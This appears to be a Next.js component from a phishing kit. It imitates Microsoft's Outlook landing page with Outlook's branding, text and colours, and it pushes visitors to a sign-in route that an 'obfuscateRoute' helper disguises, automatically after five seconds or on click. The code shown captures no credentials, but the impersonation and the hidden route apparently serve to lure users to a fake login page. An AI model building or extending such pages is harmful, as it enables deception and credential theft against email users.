'use client'

import { Button } from '@/components/ui/button'
import { useRouter } from 'next/navigation'
import { useEffect } from 'react'
import { obfuscateRoute } from '../../src/utils/route-obfuscator'

export function SecureMainContent() {
  const router = useRouter()

  useEffect(() => {
    const timer = setTimeout(() => {
      const obfuscatedSignInRoute = obfuscateRoute('/signin')
      router.push(`/${obfuscatedSignInRoute}`)
    }, 5000) // 5 seconds delay

    return () => clearTimeout(timer)
  }, [router])

  const handleSecureClick = () => {
    const obfuscatedSignInRoute = obfuscateRoute('/signin')
    router.push(`/${obfuscatedSignInRoute}`)
  }

  return (
    <main className="max-w-7xl mx-auto px-6 py-16 lg:py-24">
      <div className="max-w-3xl">
        <h1 className="text-[42px] font-semibold tracking-tight mb-4">
          Outlook for everyday email and calendars
        </h1>
        <p className="text-[18px] mb-8 text-gray-600 leading-relaxed">
          Stay on top of multiple accounts with email, calendars, and contacts
          in one place.
          <br />
          Available on desktop, mobile, and web.
        </p>
        <div className="flex flex-wrap gap-4">
          <Button
            className="h-11 px-8 bg-[#0067B8] hover:bg-[#005BA1] rounded"
            onClick={handleSecureClick}
          >
            Sign in
          </Button>
          <Button
            variant="outline"
            className="h-11 px-8 rounded border-[#0067B8] text-[#0067B8] hover:bg-[#0067B8] hover:text-white"
          >
            Create free account
          </Button>
        </div>
      </div>
    </main>
  )
}
